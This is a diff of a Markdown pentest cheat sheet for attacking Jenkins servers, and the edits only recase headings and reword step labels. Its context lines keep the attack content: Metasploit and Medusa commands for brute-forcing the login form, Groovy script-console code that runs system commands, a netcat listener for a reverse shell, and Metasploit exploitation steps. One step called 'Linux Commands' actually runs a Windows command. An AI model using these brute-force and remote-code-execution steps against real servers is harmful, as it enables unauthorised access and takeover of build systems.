@@ -1,17 +1,17 @@
-### **INTRODUCTION**
+### **Introduction**
 
 Jenkins is an open-source automation server used for continuous integration and delivery (CI/CD) in software development. It automates tasks like building, testing, and deploying software, and supports a vast range of plugins to extend its capabilities.
 
-### **IDENTIFYING JENKINS VERSION**
+### **Identifying Jenkins Version**
 
-1.  Checking Version on Login Page:  
+1.  Check Version on Login Page:  
     `Look at the bottom of the Jenkins login page for the version number.`
 2.  Using Jenkins API:  
     `curl -s http://[JENKINS-IP]/api/json | jq .`
 3.  From the System Information page:  
     After logging in, navigate to `Manage Jenkins` → `System Information`.
 
-### **BRUTE FORCE CREDENTIALS**
+### **Brute Force Credentials**
 
 1.  Brute-Forcing with Metasploit:  
     `auxiliary/scanner/http/jenkins_login`
@@ -20,11 +20,11 @@ Jenkins is an open-source automation server used for continuous integration and 
 3.  Brute-Forcing with Medusa:  
     `medusa -h [JENKINS-URL] -U /path/to/usernames.txt -P /path/to/wordlist.txt -M web-form -m DIR:/j_acegi_security_check -m FORM:'/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&Submit=Log+in:Invalid username or password'`
 
-### **REMOTE CODE EXECUTION VIA SCRIPT CONSOLE**
+### **Remote Code Execution via Script Console**
 
-1.  Access Script Console:  
+1.  Access script console:  
     `http://[JENKINS-DOMAIN]:8080/script`
-2.  Executing a Simple whoami:
+2.  Execute a Simple whoami:
     ```Groovy
     def cmd = 'whoami'
     def sout = new StringBuffer(), serr = new StringBuffer()
@@ -34,7 +34,7 @@ Jenkins is an open-source automation server used for continuous integration and 
     println sout
     ```
 
-3.  Executing Linux Commands:
+3.  Run Linux Commands:
     ```Groovy
     def cmd = "cmd.exe /c dir".execute();
     println("${cmd.text}");
@@ -58,7 +58,7 @@ Jenkins is an open-source automation server used for continuous integration and 
 6 . Run listener with rlwrap to make the shell more usable  
     `sudo rlwrap -cAr nc -lvnp 1337`
 
-### **AUTOMATING EXPLOITATION WITH METASPLOIT**
+### **Automating Exploitation with Metasploit**
 
 ```bash
 # 1. Launch Metasploit
@@ -88,7 +88,7 @@ set LPORT [LOCAL-PORT]
 # 9. Run the exploit
 exploit
 ```
-### **AUTOMATING EXPLOITATION WITH PYTHON SCRIPT**
+### **Automating Exploitation with Python Script**
 
 ```Python
 #!/usr/bin/env python3
